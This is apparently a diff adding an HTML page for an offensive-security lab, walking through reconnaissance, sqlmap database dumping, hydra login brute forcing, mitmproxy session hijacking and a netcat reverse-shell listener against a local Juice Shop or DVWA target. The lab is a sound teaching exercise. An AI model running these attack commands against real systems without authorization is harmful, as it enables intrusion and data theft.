@@ -1,0 +1,89 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>Offensive Cybersecurity Lab</title>
+    <style>
+      body { font-family: system-ui, -apple-system, Segoe UI, Roboto, "Helvetica Neue", Arial; margin: 24px; line-height: 1.6; color: #111; }
+      h1, h2, h3 { color: #7f1d1d; }
+      code, pre { background: #f6f8fa; border: 1px solid #e5e7eb; border-radius: 6px; }
+      pre { padding: 12px; overflow: auto; }
+      a.button { display: inline-block; margin: 6px 8px 6px 0; padding: 8px 12px; border-radius: 6px; border: 1px solid #b91c1c; color: #b91c1c; text-decoration: none; font-weight: 600; }
+      a.button.primary { background: #b91c1c; color: white; }
+      .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(260px, 1fr)); gap: 12px; }
+      .card { border: 1px solid #e5e7eb; border-radius: 10px; padding: 14px; background: #fff; }
+      .muted { color: #6b7280; }
+    </style>
+  </head>
+  <body>
+    <h1>Offensive Cybersecurity Lab</h1>
+    <p class="muted">Ethical hacking walkthrough: reconnaissance, enumeration, exploitation, and post-exploitation against a vulnerable web app (OWASP Juice Shop/DVWA).</p>
+
+    <div>
+      <a class="button primary" href="cheatsheet.txt" download>Download Attack Cheat Sheet</a>
+      <a class="button" href="wordlists.txt" download>Download Wordlists (sample)</a>
+      <a class="button" href="nmap-sample.txt" download>Sample Nmap Output</a>
+    </div>
+
+    <h2>Lab Setup</h2>
+    <ul>
+      <li>Attacker: Kali Linux (or Parrot) VM</li>
+      <li>Target: OWASP Juice Shop or DVWA in Docker: <code>docker run -d -p 3000:3000 bkimminich/juice-shop</code></li>
+      <li>Network: Host-only or NAT; ensure attacker can reach target (e.g., http://127.0.0.1:3000)</li>
+    </ul>
+
+    <h2>Phases</h2>
+    <div class="grid">
+      <div class="card">
+        <h3>1) Recon & Scanning</h3>
+        <pre><code># Host discovery
+nmap -sn 192.168.56.0/24
+
+# Service/version scan
+nmap -sV -sC -p- 127.0.0.1
+
+# Web enumeration
+whatweb http://127.0.0.1:3000
+gobuster dir -u http://127.0.0.1:3000 -w /usr/share/wordlists/dirb/common.txt</code></pre>
+      </div>
+      <div class="card">
+        <h3>2) Vulnerability Discovery</h3>
+        <pre><code># Nikto quick scan
+nikto -h http://127.0.0.1:3000
+
+# SQLi discovery (Burp/OWASP ZAP recommended)
+sqlmap -u "http://127.0.0.1:3000/rest/products/search?q=test" --level=5 --risk=2 --dbs</code></pre>
+      </div>
+      <div class="card">
+        <h3>3) Exploitation</h3>
+        <pre><code># Login brute force (example; ensure authorized!)
+hydra -l admin -P wordlists.txt 127.0.0.1 http-post-form \
+"/login:email=^USER^&password=^PASS^:S=Logout"
+
+# SQLi exploit via sqlmap
+sqlmap -u "http://127.0.0.1:3000/rest/products/search?q=test" --dump-all --batch</code></pre>
+      </div>
+      <div class="card">
+        <h3>4) Post-Exploitation</h3>
+        <pre><code># Session hijacking demo (for educational purposes)
+sudo mitmproxy --mode transparent
+
+# Reverse shell (if applicable) — target-dependent
+nc -lvnp 4444
+# then trigger payload from app to connect back to attacker</code></pre>
+      </div>
+    </div>
+
+    <h2>Reporting</h2>
+    <ul>
+      <li>Document findings, PoC steps, and risk impact.</li>
+      <li>Provide remediation guidance (patching, config hardening, WAF rules).</li>
+    </ul>
+
+    <h2>Legal Notice</h2>
+    <p>Use only in controlled environments you own or have explicit permission to test. This lab is for educational purposes.</p>
+  </body>
+  </html>
+
+
